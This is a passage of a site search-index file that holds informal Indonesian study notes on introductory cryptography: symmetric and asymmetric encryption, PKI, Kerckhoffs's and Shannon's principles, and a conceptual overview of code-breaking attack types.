surat make kunci yang sama. Ntu namanya simetris. Intinya, ya, cuma ada dikunci. Kalo si B ngeduplikat ato out of nowhere punya kuncinya, terus ngebaca cit cat ( baca; isi ghibahan ) lu sama si A, yauda abis dah lu bedua WKWK.","title":"Apasih Enkripsi Semetris?"},{"location":"Materi/Kriptografi___Enkripsi%20Simetris%20dan%20Asimetris/#macamnya","text":"Enkripsi simetris dapat dikategorikan menjadi dua jenis utama: block cipher dan stream cipher . Block Cipher collapsed:: true Memproses data dalam ukuran blok tertentu (misalnya 64-bit atau 128-bit) sekaligus, setiap blok dienkripsi atau didekripsi menggunakan algoritma dan kunci tertentu. DES (Data Encryption Standard) logseq.order-list-type:: number Dikembangkan oleh IBM pada tahun 1970-an, distandardisasi oleh pemerintah AS pada 1977, panjang 56-bit, sudah jarang karena tingkat keamanannya. 3DES (Triple DES) logseq.order-list-type:: number Diciptakan untuk memperbaiki kelemahan DES, enkripsi dengan algoritma DES sebanyak tiga kali (encrypt-decrypt-encrypt), panjang 168-bit. AES (Advanced Encryption Standard) logseq.order-list-type:: number Distandardisasi oleh NIST ( National Institute of Standards and Technology ) pada tahun 2001, paling banyak digunakan karena keamanannya dan kecepatannya. Panjang 128, 192, dan 256-bit. Stream Cipher Memproses data sebagai aliran bit atau byte secara terus-menerus, melakukan operasi enkripsi dan dekripsi pada aliran data tersebut. Data diproses satu per satu, sehingga cocok digunakan untuk komunikasi data yang sifatnya real-time (misalnya streaming). RC4 (Rivest Cipher 4) logseq.order-list-type:: number Dikembangkan oleh Ron Rivest pada tahun 1987, panjang bervariasi, cepat dan sederhana, tapi terdapat kelemahan. Salsa20 dan ChaCha20 logseq.order-list-type:: number Algoritma stream cipher modern yang lebih aman dan cepat, banyak digunakan pada perangkat dengan keterbatasan daya (seperti smartphone dan IoT) karena efisien dalam konsumsi energi.","title":"Macamnya"},{"location":"Materi/Kriptografi___Enkripsi%20Simetris%20dan%20Asimetris/#begin_note","text":"Singkatnya, block cipher cocok untuk data dalam ukuran besar dan tetap, sedangkan stream cipher lebih efisien untuk data yang mengalir secara terus-menerus. #+END_NOTE","title":"+BEGIN_NOTE"},{"location":"Materi/Kriptografi___Enkripsi%20Simetris%20dan%20Asimetris/#enkripsi-asimetris-asymmetric-encryption","text":"","title":"Enkripsi Asimetris (Asymmetric Encryption)"},{"location":"Materi/Kriptografi___Enkripsi%20Simetris%20dan%20Asimetris/#apa-itu-enkripsi-asimetris","text":"Metode enkripsi yang menggunakan dua kunci berbeda\u2014kunci publik dan kunci pribadi\u2014untuk mengenkripsi dan mendekripsi data ibm atau proses penggunaan kunci publik dari pasangan kunci publik/pribadi untuk mengenkripsi teks biasa, lalu menggunakan kunci pribadi yang sesuai untuk mendekripsi ciphertext cloud.google . Solusi ini umumnya dianggap lebih aman, meskipun kurang efisien, daripada enkripsi simetris. #+BEGIN_CENTER https://storage.hackviser.com/file/hackviser-prod/trainings/sections/images/461ed9b5-fe53-43a0-a900-e38eda265be4/image-1-833b0f46d.webp #+END_CENTER","title":"Apa itu Enkripsi Asimetris"},{"location":"Materi/Kriptografi___Enkripsi%20Simetris%20dan%20Asimetris/#public-key-infrastructure-pki","text":"Skema enkripsi asimetris biasanya diimplementasikan melalui PKI. PKI adalah kerangka kerja untuk membuat, mendistribusikan, dan memvalidasi pasangan kunci publik dan privat. Keamanan kriptografi kunci publik bergantung pada penjagaan kerahasiaan kunci privat sembari membagikan kunci publik secara bebas. Kunci publik hanya dapat mengenkripsi data, sehingga tidak terlalu berharga bagi pelaku ancaman. Selain itu, karena pengguna tidak perlu membagikan kunci pribadi mereka, hal ini sangat mengurangi risiko peretas mencegat kunci yang jauh lebih berharga tersebut.","title":"Public Key Infrastructure (PKI)"},{"location":"Materi/Kriptografi___Enkripsi%20Simetris%20dan%20Asimetris/#algoritma","text":"Algoritma enkripsi asimetris merupakan tulang punggung dari ekosistem kriptografi modern, menyediakan dasar untuk komunikasi yang aman dan melindungi data sensitif dari akses yang tidak sah. Berikut adalah beberapa algoritma enkripsi asimetris yang umum digunakan: Rivest-Shamir-Adleman (RSA) logseq.order-list-type:: number Dinamai menggunakan nama penemunya. Solusi ini mengandalkan kompleksitas matematika bilangan prima untuk menghasilkan pasangan kunci, meskipun dikembangkan pada tahun 1970-an, RSA tetap banyak digunakan. ECC (Elliptic Curve Cryptography) logseq.order-list-type:: number Berdasarkan sifat matematika kurva elips di atas bidang terbatas, tingkat keamanan setara dengan RSA tetapi dengan panjang kunci yang jauh lebih pendek (contoh: kunci ECC 256-bit \u2248 RSA 2048-bit). DSA (Digital Signature Algorithm) logseq.order-list-type:: number Memungkinkan organisasi dan individu untuk membuat tanda tangan digital yang memastikan keaslian dan integritas pesan atau dokumen. Distandardisasi oleh NIST, DSA mengandalkan masalah matematika dari logaritma diskrit dan muncul dalam berbagai protokol keamanan.","title":"Algoritma"},{"location":"Materi/Kriptografi___Enkripsi%20Simetris%20dan%20Asimetris/#begin_note_1","text":"Sering digunakan pada HTTPS, SSH, TLS, VPN, email, dan tanda tangan digital. #+END_NOTE","title":"+BEGIN_NOTE"},{"location":"Materi/Kriptografi___Enkripsi%20Simetris%20dan%20Asimetris/#kelebihan-dan-kekurangan","text":"Berikut adalah tabel perbandingan yang merangkum kelebihan dan kekurangan dari enkripsi simetris dan asimetris. Fitur Enkripsi Simetris Enkripsi Asimetris Kelebihan \ud83d\udc4d \ud83d\ude80 Kecepatan Sangat Cepat. Efisien untuk mengenkripsi data dalam jumlah besar. Lambat. Proses komputasinya jauh lebih berat. \ud83d\udcbb Sumber Daya Ringan. Membutuhkan lebih sedikit daya komputasi. Berat. Membutuhkan sumber daya komputasi yang signifikan. \u2728 Kesederhanaan Algoritma dan implementasinya cenderung lebih sederhana. Algoritma lebih kompleks. Kekurangan \ud83d\udc4e \ud83d\ude9a Distribusi Sulit dan Berisiko. Membagikan kunci rahasia secara aman adalah tantangan terbesar. Mudah dan Aman . Kunci publik dapat didistribusikan secara bebas tanpa membahayakan kunci privat. \ud83d\udd11 Manajemen Kompleks, terutama dalam jaringan besar karena setiap pasangan pengguna memerlukan kunci yang berbeda. Lebih Sederhana. Setiap pengguna hanya perlu mengelola satu pasang kuncinya sendiri. \ud83d\udee1\ufe0f Keamanan & Fitur Jika kunci bocor, semua data yang dienkripsi dengan kunci itu terekspos. Sangat Aman. Menyediakan fitur otentikasi dan integritas melalui tanda tangan digital. - - tags:: #Kriptografi #EnkripsiAsimetris #EnkripsiSimetris #Enkripsi","title":"Kelebihan dan Kekurangan"},{"location":"Materi/Kriptografi___Intro/","text":"Senin, 25 Agustus 2025 2:31 Apa itu kriptografi Sebuah metode yang menggunakan matematika dan algoritma tertentu untuk mengirim atau menyimpan suatu informasi secara aman. Buat apasih? Menjaga kerahasiaan informasi, informasi hanya dapat dibaca oleh pihak-pihak tertentu Menjaga integritas dari suatu informasi, biar ga diubah-ubah ato manip tanpa ijin Autentikasi , mastiin keaslian sumber ato keaslian informasi Non-repudiation , ngejamin bahwa pengirim tidak dapat menyangkal bahwa ia telah mengirim informasi tersebut. Prinsip dasarnya Kerckhoffs (Kerckhoffs's Principle ) Bergantung pada key , bukan algoritmanya. Jadi, semisal algoritmanya banyak yang tau, selagi mereka ga tau key -nya ya aman-aman aja (selama key -nya ga bocor, ya). #+BEGIN_NOTE Misalnya, algoritma enkripsi AES diketahui secara publik dan terdokumentasi dengan baik. Namun, keamanan tetap terjamin karena hanya kunci rahasia (misalnya 128-bit key) yang menentukan akses ke data. #+END_NOTE Teori Ketidakpastian Shannon (Shannon's Uncertainty Theory ) Chipertext (cypher valorant, canda) atau teks yang dienkripsi, sejatinya ga boleh punya pola yang bermakna dan harus keliatan acak-acakan, biar ga bisa ditebak. #+BEGIN_NOTE Contohnya, ketika sebuah teks dienkripsi dengan AES atau RSA, hasil ciphertext terlihat seperti rangkaian karakter acak tanpa pola statistik. Hal ini membuat penyerang sulit menebak isi pesan asli. #+END_NOTE Code Breaking Teknik memecahkan sistem kriptografi tanpa mengetahui kunci rahasia. Tujuan utamanya adalah menemukan pesan asli ( plaintext ) dari pesan terenkripsi ( ciphertext ) atau bahkan mengungkap kunci enkripsi yang digunakan. Code breaking memanfaatkan kelemahan dalam algoritma, kesalahan implementasi, atau kebiasaan manusia (misalnya penggunaan password lemah). #+BEGIN_TIP Dalam sejarah, istilah code breaking banyak digunakan, seperti ketika Alan Turing dan timnya di Bletchley Park berhasil memecahkan mesin sandi Enigma Jerman pada Perang Dunia II. #+END_TIP Macam-macamnya Saat ini, kriptanalisis modern mencakup berbagai teknik, antara lain: Brute Force Attack (Serangan Brute Force) Contoh: Penyerang mencoba semua kombinasi password untuk masuk ke akun email. Jika password hanya 4 digit angka, ada 10.000 kemungkinan (0000\u20139999), yang relatif mudah ditembus. Dictionary Attack (Serangan Kamus) Contoh: Banyak orang memakai password sederhana seperti \"123456\", \"qwerty\", atau \"password\". Penyerang menggunakan daftar (dictionary) password umum untuk mencoba masuk. Side-Channel Attack (Serangan Sampingan) Contoh: Pada smart card atau kartu kredit dengan chip, penyerang bisa menganalisis waktu eksekusi enkripsi atau konsumsi listrik untuk menebak kunci. Statistical Attack (Serangan Statistik) Contoh: Pada algoritma enkripsi lama seperti Caesar Cipher atau Vigen\u00e8re Cipher, distribusi huruf dalam ciphertext masih menyerupai distribusi huruf dalam bahasa aslinya. Misalnya, huruf \"E\" paling sering muncul dalam bahasa Inggris. Penyerang bisa menebak pola ini untuk memecahkan kode. - tags:: #Kriptografi #CodeBreaking","title":"Kriptografi   Intro"},{"location":"Materi/Kriptografi___Intro/#apa-itu-kriptografi","text":"Sebuah metode yang menggunakan matematika dan algoritma tertentu untuk mengirim atau menyimpan suatu informasi secara aman.","title":"Apa itu kriptografi"},{"location":"Materi/Kriptografi___Intro/#buat-apasih","text":"Menjaga kerahasiaan informasi, informasi hanya dapat dibaca oleh pihak-pihak tertentu Menjaga integritas dari suatu informasi, biar ga diubah-ubah ato manip tanpa ijin Autentikasi , mastiin keaslian sumber ato keaslian informasi Non-repudiation , ngejamin bahwa pengirim tidak dapat menyangkal bahwa ia telah mengirim informasi tersebut.","title":"Buat apasih?"},{"location":"Materi/Kriptografi___Intro/#prinsip-dasarnya","text":"","title":"Prinsip dasarnya"},{"location":"Materi/Kriptografi___Intro/#kerckhoffs-kerckhoffss-principle","text":"Bergantung pada key , bukan algoritmanya. Jadi, semisal algoritmanya banyak yang tau, selagi mereka ga tau key -nya ya aman-aman aja (selama key -nya ga bocor, ya). #+BEGIN_NOTE Misalnya, algoritma enkripsi AES diketahui secara publik dan terdokumentasi dengan baik. Namun, keamanan tetap terjamin karena hanya kunci rahasia (misalnya 128-bit key) yang menentukan akses ke data. #+END_NOTE","title":"Kerckhoffs (Kerckhoffs's Principle)"},{"location":"Materi/Kriptografi___Intro/#teori-ketidakpastian-shannon-shannons-uncertainty-theory","text":"Chipertext (cypher valorant, canda) atau teks yang dienkripsi, sejatinya ga boleh punya pola yang bermakna dan harus keliatan acak-acakan, biar ga bisa ditebak. #+BEGIN_NOTE Contohnya, ketika sebuah teks dienkripsi dengan AES atau RSA, hasil ciphertext terlihat seperti rangkaian karakter acak tanpa pola statistik. Hal ini membuat penyerang sulit menebak isi pesan asli. #+END_NOTE","title":"Teori Ketidakpastian Shannon (Shannon's Uncertainty Theory)"},{"location":"Materi/Kriptografi___Intro/#code-breaking","text":"Teknik memecahkan sistem kriptografi tanpa mengetahui kunci rahasia. Tujuan utamanya adalah menemukan pesan asli ( plaintext ) dari pesan terenkripsi ( ciphertext ) atau bahkan mengungkap kunci enkripsi yang digunakan. Code breaking memanfaatkan kelemahan dalam algoritma, kesalahan implementasi, atau kebiasaan manusia (misalnya penggunaan password lemah). #+BEGIN_TIP Dalam sejarah, istilah code breaking banyak digunakan, seperti ketika Alan Turing dan timnya di Bletchley Park berhasil memecahkan mesin sandi Enigma Jerman pada Perang Dunia II. #+END_TIP","title":"Code Breaking"},{"location":"Materi/Kriptografi___Intro/#macam-macamnya","text":"Saat ini, kriptanalisis modern mencakup berbagai teknik, antara lain: Brute Force Attack (Serangan Brute Force) Contoh: Penyerang mencoba semua kombinasi password untuk masuk ke akun email. Jika password hanya 4 digit angka, ada 10.000 kemungkinan (0000\u20139999), yang relatif mudah ditembus. Dictionary Attack (Serangan Kamus) Contoh: Banyak orang memakai password sederhana seperti \"123456\", \"qwerty\", atau \"password\". Penyerang menggunakan daftar (dictionary) password umum untuk mencoba masuk. Side-Channel Attack (Serangan Sampingan) Contoh: Pada smart card atau kartu kredit dengan chip, penyerang bisa menganalisis waktu eksekusi enkripsi atau konsumsi listrik untuk menebak kunci. Statistical Attack (Serangan Statistik) Contoh: Pada algoritma enkripsi lama seperti Caesar Cipher atau Vigen\u00e8re Cipher, distribusi huruf dalam ciphertext masih menyerupai distribusi huruf dalam bahasa aslinya. Misalnya, huruf \"E\" paling sering muncul dalam bahasa Inggris. Penyerang bisa menebak pola ini untuk memecahkan kode. - tags:: #Kriptografi #CodeBreaking","title":"Macam-macamnya"},{"location":"Materi/asd/","text":"Admonition + Code You may face the limits of codehilite however. def fibonacci ( n ): a , b = 0 , 1 for _ in range ( n ): yield a a , b = b , a + b for num in fibonacci ( 10 ): print ( num )","title":"Index"}]}